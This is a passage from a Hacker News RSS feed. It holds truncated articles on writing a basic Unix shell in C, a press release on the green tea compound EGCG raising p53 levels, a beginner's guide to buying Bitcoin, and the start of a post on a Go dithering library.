configuration files.  These change aspects of the shell‚Äôs behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we‚Äôre
going to use them for the basis for our shell.  Our shell will be so simple that
there won‚Äôt be any configuration files, and there won‚Äôt be any shutdown command.
So, we‚Äôll just call the looping function and then terminate.  But in terms of
architecture, it‚Äôs important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We‚Äôll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we‚Äôve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I‚Äôll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let‚Äôs walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we‚Äôre using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don‚Äôt know ahead of time how much text a user will enter
into their shell.  You can‚Äôt simply allocate a block and hope they don‚Äôt exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we‚Äôll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn‚Äôt noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that‚Äôs
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it‚Äôs the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that‚Äôs really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn‚Äôt know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I‚Äôm leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You‚Äôd be robbing yourself of a
learning opportunity if you didn‚Äôt!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we‚Äôve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I‚Äôm going to make a glaring simplification here,
and say that we won‚Äôt allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is ‚Äútokenize‚Äù the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it‚Äôs because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we‚Äôre doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we‚Äôre really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what‚Äôs going on with processes and how they start.  That‚Äôs why I‚Äôm going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn‚Äôt count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren‚Äôt Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Antioxidant in green tea may increase levels of p53, an anti-cancer protein]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26125671">thread link</a>) | @finphil
<br/>
February 13, 2021 | https://nuadox.com/post/643030841522536448/green-tea-p53-protein | <a href="https://web.archive.org/web/*/https://nuadox.com/post/643030841522536448/green-tea-p53-protein">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="643030841522536448">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/643030841522536448/green-tea-p53-protein"><h2>Antioxidant in green tea may increase levels of p53, an anti-cancer protein</h2></a>
                                <figure data-orig-width="1280" data-orig-height="855"><img src="https://64.media.tumblr.com/f6a0a630187afd9268b0372fbcc4e09e/1ae3647e82144769-00/s1280x1920/fc9b00fcd69f86ea10d75049e36b11fb66730a5e.jpg" alt="image" data-orig-width="1280" data-orig-height="855" width="1280" height="855"></figure><p><b>- By&nbsp;<a href="https://href.li/?https://info.rpi.edu/people/mary-l-martialay">Mary L. Martialay</a> ,&nbsp;<a href="https://href.li/?https://www.rpi.edu/">Rensselaer Polytechnic Institute</a> -</b></p><p>An antioxidant found in green tea may increase levels of p53, a natural anti-cancer protein, known as the ‚Äúguardian of the genome‚Äù for its ability to repair DNA damage or destroy cancerous cells.&nbsp;</p><p>Published on February 12 in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.nature.com%2Farticles%2Fs41467-021-21258-5&amp;t=Y2U5NDk4Zjc5OTA2ODA2N2JjMzI5OGI2N2U3YWZjMDNjYWU5MTBlNCxlUURrZXFETg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F643030841522536448%2Fgreen-tea-p53-protein&amp;m=0&amp;ts=1613420977"><i>Nature Communications</i>,</a> a study of the direct interaction between p53 and the green tea compound, epigallocatechin gallate (EGCG), points to a new target for cancer drug discovery.</p><p>‚ÄúBoth p53 and EGCG molecules are extremely interesting. Mutations in p53 are found in over 50% of human cancer, while EGCG is the major anti-oxidant in green tea, a popular beverage worldwide,‚Äù said <a href="https://href.li/?http://homepages.rpi.edu/~wangc5/index.html">Chunyu Wang</a>, corresponding author and a professor of biological sciences at <a href="https://href.li/?https://rpi.edu/">Rensselaer Polytechnic Institute</a>. ‚ÄúNow we find that there is a previously unknown, direct interaction between the two, which points to a new path for developing anti-cancer drugs. Our work helps to explain how EGCG is able to boost p53‚Äôs anti-cancer activity, opening the door to developing drugs with EGCG-like compounds.‚Äù</p><p>Wang, a member of the <a href="https://href.li/?https://www.youtube.com/watch?v=Hm_O0FqYSt4">Rensselaer Center for Biotechnology and Interdisciplinary Studies</a>, is an expert in using nuclear magnetic resonance spectroscopy to study <a href="https://href.li/?https://news.rpi.edu/content/2021/01/26/new-nih-grant-supports-single-molecule-study-protein-key-alzheimer-%E2%80%99s-disease">specific mechanisms in Alzheimer‚Äôs disease</a> and <a href="https://href.li/?https://news.rpi.edu/content/2017/02/27/hedgehog-cancer-and-zinc">cancer</a>, including p53, which he described as ‚Äúarguably the most important protein in human cancer.‚Äù</p><p>P53 has several well-known anti-cancer functions, including halting cell growth to allow for DNA repair, activating DNA repair, and initiating programmed cell death ‚Äî called apoptosis ‚Äî if DNA damage cannot be repaired. One end of the protein, known as the N-terminal domain, has a flexible shape, and therefore, can potentially serve several functions depending on its interaction with multiple molecules.</p><p>EGCG is a natural antioxidant, which means it helps to undo the near constant damage caused during oxygen metabolism. Found in abundance in green tea, EGCG is also packaged as an herbal supplement.</p><p>Wang‚Äôs team found that the interaction between EGCG and p53 preserves the protein against degradation. Typically, after being produced within the body, p53 is quickly degraded when the N-terminal domain interacts with a protein called MDM2. This regular cycle of production and degradation holds p53 levels at a low constant.</p><p>‚ÄúBoth EGCG and MDM2 bind at the same place on p53, the N-terminal domain, so EGCG competes with MDM2,‚Äù said Wang. ‚ÄúWhen EGCG binds with p53, the protein is not being degraded through MDM2, so the level of p53 will increase with the direct interaction with EGCG, and that means there is more p53 for anti-cancer function. This is a very important interaction.‚Äù</p><p>‚ÄúBy developing an understanding of the molecular-level mechanisms that control key biochemical interactions linked to devastating illnesses such as cancer and Alzheimer‚Äôs disease, Chunyu‚Äôs research is laying the groundwork for new and successful therapies,‚Äù said Curt Breneman, dean of the Rensselaer School of Science.</p><p>‚Äì</p><p><b>Source:&nbsp;<a href="https://href.li/?https://news.rpi.edu/content/2021/02/12/green-tea-compound-aids-p53-guardian-genome-and-tumor-suppressor">Rensselaer Polytechnic Institute</a></b></p><p><b>Full study:</b>&nbsp;‚ÄúEGCG binds intrinsically disordered N-terminal domain of p53 and disrupts p53-MDM2 interaction‚Äù, <i>Nature Communications</i>.</p><p><a href="https://href.li/?https://doi.org/10.1038/s41467-021-21258-5">https://doi.org/10.1038/s41467-021-21258-5</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625997758414929920/synthesizing-cepafungin">Chemists efficiently synthesize natural anti-cancer compound cepafungin I</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/tea">tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/green-tea">green tea</a>
                                    
                                        <a href="https://nuadox.com/tagged/cancer">cancer</a>
                                    
                                        <a href="https://nuadox.com/tagged/oncology">oncology</a>
                                    
                                        <a href="https://nuadox.com/tagged/antioxidants">antioxidants</a>
                                    
                                        <a href="https://nuadox.com/tagged/p53">p53</a>
                                    
                                        <a href="https://nuadox.com/tagged/dna">dna</a>
                                    
                                        <a href="https://nuadox.com/tagged/genetics">genetics</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/egcg">egcg</a>
                                    
                                    </p>
                                </span></p>
                                
<ol><!-- START NOTES --><!-- END NOTES --></ol></div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/643030841522536448/green-tea-p53-protein</link>
            <guid isPermaLink="false">hacker-news-small-sites-26125671</guid>
            <pubDate>Sat, 13 Feb 2021 18:50:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner‚Äôs Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 82 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the ‚Äúoriginal‚Äù cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ‚Äï but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of ‚Äúdigital money‚Äù that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ‚Äï with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network‚Äôs miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ‚Äï this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ‚Äï think of them as ‚Äúprotectors‚Äù who are constantly monitoring Bitcoin‚Äôs blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin‚Äôs value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ‚Äï to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin‚Äôs technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let‚Äôs dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ‚Äï the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ‚Äï so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop‚Äôs window that says ‚ÄúBitcoin accepted here.‚Äù As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 ‚Äì beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It‚Äôs the product of many hours of research, experimentation, and refactoring. I‚Äôm
